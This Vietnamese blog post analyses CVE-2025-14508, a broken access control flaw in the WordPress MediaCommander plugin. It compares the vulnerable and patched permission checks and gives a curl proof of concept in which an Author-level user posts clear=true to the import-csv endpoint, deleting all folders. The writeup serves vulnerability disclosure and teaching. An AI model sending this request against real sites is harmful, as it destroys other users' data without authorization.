# CVE-2025-14508 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **The MediaCommander – Bring Folders to Media, Posts, and Pages** cho WordPress tồn tại lỗ hổng **xóa dữ liệu trái phép** do **thiếu kiểm tra quyền (capability check)** tại **REST API endpoint `import-csv`** trong tất cả các phiên bản **≤ 2.3.1**.
Nguyên nhân là do endpoint này chỉ sử dụng kiểm tra quyền **`upload_files`** (**cấp Author**) cho một **thao tác mang tính phá hủy** có thể **xóa toàn bộ folder**.
Điều này cho phép **kẻ tấn công đã xác thực**, với quyền **Author trở lên**, có thể **xóa toàn bộ dữ liệu tổ chức thư mục** do **Administrator** và **người dùng khác** tạo ra.

* **CVE ID**: [CVE-2025-14508](https://www.cve.org/CVERecord?id=CVE-2025-14508)
* **Vulnerability Type**: Broken Access Control
* **Affected Versions**: <= 2.3.1
* **Patched Versions**: 2.4.0
* **CVSS severity**: Low (6.5)
* **Required Privilege**: Author
* **Product**: [WordPress MediaCommander – Bring Folders to Media, Posts, and Pages Plugin](https://wordpress.org/plugins/mediacommander/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **MediaCommander – Bring Folders to Media, Posts, and Pages**:  
    * `2.3.1` – **vulnerable**  
    * `2.4.0` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Plugin đăng ký **REST API** endpoint `/import-csv` với phương thức POST như sau:

```php {title="FolderController.php v2.3.1" data-open=true hl_lines=[6]}
register_rest_route(
    MEDIACOMMANDER_PLUGIN_REST_URL, // mediacommander/v1
    '/import-csv',
    [
        'methods' => \WP_REST_Server::CREATABLE, // POST
        'callback' => [ $this, 'importCSV' ],
        'permission_callback' => [ $this, 'canUploadFiles' ]
    ]
);
```

`permission_callback` là `canUploadFiles` để kiểm tra quyền:

```php
public function canUploadFiles() {
    return current_user_can( 'upload_files' );
}
```

* Quyền `upload_files` dành cho người dùng từ Author trở lên.
* Nếu người dùng không có quyền, REST API trả về lỗi 403.

Nếu có quyền, callback `importCSV` được gọi để xử lý:

```php {title="FolderController.php v2.3.1" data-open=true hl_lines=[4]}
public function importCSV( \WP_REST_Request $request ) {
    $params  = $request->get_file_params();
    $file = $params['file']['tmp_name'];
    $clear  = filter_var( $request->get_param( 'clear' ), FILTER_VALIDATE_BOOLEAN );
    $attachments  = filter_var( $request->get_param( 'attachments' ), FILTER_VALIDATE_BOOLEAN );

    $data = FoldersModel::importCSV( $file, $clear, $attachments );
    $response = isset( $data ) ? [ 'success' => true, 'data' => $data ] : [ 'success' => false ];

    return new \WP_REST_Response( $response );
}
```

`importCSV` thực hiện:

* Lấy file CSV từ request.
* Lấy các tham số `clear` và `attachments`, chuyển về boolean.
* Gọi `FoldersModel::importCSV` để xử lý dữ liệu CSV.
* Trả về JSON gồm `success` và `data` (nếu có) hoặc `success: false` khi lỗi.

>[!WARNING]
> Tham số `clear` sẽ xóa toàn bộ các folder cũ nếu được đặt là `true`.
> ![clear](clear.png "Tham số clear")

**Bản vá (v2.4.0)** khắc phục lỗ hổng bằng cách thay đối logic kiểm tra quyền:

```php {title="FolderController.php v2.4.0" data-open=true hl_lines=[7]}
register_rest_route(
    MEDIACOMMANDER_PLUGIN_REST_URL,
    '/import-csv',
    [
        'methods' => \WP_REST_Server::CREATABLE,
        'callback' => [ $this, 'importCSV' ],
        'permission_callback' => [ $this, 'canManageOptions' ]
    ]
);
```

`permission_callback` là `canManageOptions`

```php {title="FolderController.php v2.4.0" data-open=true hl_lines=[]}
public function canManageOptions() {
    return current_user_can( 'manage_options' );
}
```

Quyền `manage_options` dành cho người dùng từ Administrator trở lên.

## Flow
{{< mermaid >}}
graph TD

A["Authenticated user (Author+)"] --> B["POST /wp-json/mediacommander/v1/import-csv"]
B --> C["permission_callback: canUploadFiles()"]
C --> D{"Has upload_files capability?"}
D -- Yes --> E["importCSV() executes"]
D -- No --> Z["403 Forbidden"]

E --> F["Read CSV file and parameters (clear, attachments)"]
F --> G{"clear == true?"}
G -- Yes --> H["Delete all existing folders"]
H --> K["Broken Access Control: destructive action allowed for Author"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Login bằng Author account
2. Lấy `nonce` từ response trả về:

![Nonce](nonce.png "Nonce trong response")

3. Gửi request với header `X-WP-Nonce` là giá trị `nonce` lấy được từ response:
```sh
curl -X POST "http://localhost/wp-json/mediacommander/v1/import-csv" \
  -H "Cookie: Author cookie" \
  -H "X-WP-Nonce: 7323b67e07" \
  -F "file=@./file.csv" \
  -F "clear=true" \
  -F "attachments=false"
```

## Conclusion

Lỗ hổng CVE-2025-14508 cho thấy plugin **MediaCommander ≤ 2.3.1** cho phép người dùng **Author trở lên** thực hiện thao tác **xóa toàn bộ folder** của người khác thông qua REST API `import-csv`. Nguyên nhân là **thiếu kiểm tra quyền phù hợp** cho hành động phá hủy dữ liệu. Bản vá **2.4.0** đã sửa bằng cách nâng quyền kiểm tra lên **Administrator** (`manage_options`), ngăn chặn việc xóa trái phép.

## Key Takeaways

* Luôn phân quyền chính xác theo mức độ rủi ro của hành động (destructive actions chỉ dành cho Administrator).
* Kiểm tra capability trong REST API phải phù hợp với tính chất thao tác, không chỉ dựa vào quyền cơ bản như `upload_files`.
* Tham số như `clear` có thể gây **mất dữ liệu toàn bộ**, cần xử lý cẩn trọng và kết hợp kiểm tra quyền.
* Sử dụng nonce và cookie đúng cách nhưng không thể bù đắp cho **broken access control**.

## References
[Broken Access Control](https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/)

[WordPress MediaCommander – Bring Folders to Media, Posts, and Pages Plugin <= 2.3.1 is vulnerable to Broken Access Control](https://patchstack.com/database/wordpress/plugin/mediacommander/vulnerability/wordpress-mediacommander-plugin-2-3-1-missing-authorization-to-authenticated-author-media-folder-deletion-vulnerability) 

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-15-cve-2025-14508/  

